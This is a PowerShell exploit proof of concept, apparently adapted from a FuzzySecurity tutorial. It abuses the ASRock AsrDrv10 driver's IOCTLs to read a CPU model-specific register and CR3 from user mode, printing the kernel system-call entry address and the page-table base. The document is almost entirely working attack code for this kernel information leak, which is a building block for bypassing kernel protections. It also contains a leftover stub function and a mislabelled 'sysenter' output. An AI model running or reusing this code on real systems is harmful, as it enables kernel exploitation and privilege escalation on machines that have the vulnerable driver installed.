# Based of FuzzeySec example code located at https://www.fuzzysecurity.com/tutorials/expDev/23.html
Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;
   
public static class Driver
{
    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern IntPtr CreateFile(
        String lpFileName,
        UInt32 dwDesiredAccess,
        UInt32 dwShareMode,
        IntPtr lpSecurityAttributes,
        UInt32 dwCreationDisposition,
        UInt32 dwFlagsAndAttributes,
        IntPtr hTemplateFile);
   
    [DllImport("Kernel32.dll", SetLastError = true)]
    public static extern bool DeviceIoControl(
        IntPtr hDevice,
        int IoControlCode,
        byte[] InBuffer,
        int nInBufferSize,
        IntPtr OutBuffer,
        int nOutBufferSize,
        ref int pBytesReturned,
        IntPtr Overlapped);
 
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(
        IntPtr lpAddress,
        uint dwSize,
        UInt32 flAllocationType,
        UInt32 flProtect);
}
"@

function ReadMSR {
   param( $WhichMSR)
   Write-Host "I did something -- $String!"
}

 
#----------------[Get Driver Handle]

$DriverName = "\\.\AsrDrv10"
  
$hDevice = [Driver]::CreateFile($DriverName, [System.IO.FileAccess]::ReadWrite,
[System.IO.FileShare]::ReadWrite, [System.IntPtr]::Zero, 0x3, 0x40000080, [System.IntPtr]::Zero)
 
if ($hDevice -eq -1) {
    echo "`n[!] Unable to get driver handle..`n"
    Return
} else {
    echo "`n[>] Driver access OK.."
    "[+] lpFileName: {0}" -f $DriverName
    echo "[+] Handle: $hDevice"
}
 
#----------------[Prepare buffer & Send IOCTL]

Function ReadMSR {
    param( $WhichMSR )

    $InBuffer = @(
    [System.BitConverter]::GetBytes([Int64]0x0) +
    [System.BitConverter]::GetBytes([Int32]$WhichMSR)
    )
    $OutBuffer = [Driver]::VirtualAlloc([System.IntPtr]::Zero, 32, 0x3000, 0x40)

    $IntRet = 0
    $CallResult = [Driver]::DeviceIoControl($hDevice, 0x222848, $InBuffer, $InBuffer.Length, $OutBuffer, 32, [ref]$IntRet, [System.IntPtr]::Zero)
    if (!$CallResult) {
        echo "`n[!] DeviceIoControl failed..`n"
        Return
    }
     
    #----------------[Read out the result buffer]
    $MSRLow = [System.Runtime.InteropServices.Marshal]::ReadInt32($OutBuffer.ToInt64())
    $MSRHigh = [System.Runtime.InteropServices.Marshal]::ReadInt32($OutBuffer.ToInt64()+12)
    $MSRValue = ( [Int64]$MSRHigh -shl 32 ) -bor [Int64]$MSRLow
    
    Return $MSRValue
}

Function ReadCR {
    param( $WhichCR )

    $InBuffer = [System.BitConverter]::GetBytes([Int64]$WhichCR)
    $OutBuffer = [Driver]::VirtualAlloc([System.IntPtr]::Zero, 32, 0x3000, 0x40)

    $IntRet = 0
    $CallResult = [Driver]::DeviceIoControl($hDevice, 0x22286c, $InBuffer, $InBuffer.Length, $OutBuffer, 32, [ref]$IntRet, [System.IntPtr]::Zero)
    if (!$CallResult) {
        echo "`n[!] DeviceIoControl failed..`n"
        Return
    }
     
    #----------------[Read out the result buffer]
    $CRValue = [System.Runtime.InteropServices.Marshal]::ReadInt64($OutBuffer, 8)
    
    Return $CRValue
}
    
$EntryPoint = ReadMSR(0xc0000082)
"Kernel sysenter entrypoint is {0:X16}" -f $EntryPoint

$KernelPageTables = ReadCR(3)
"Base of kernel page tables is {0:X16}" -f $KernelPageTables
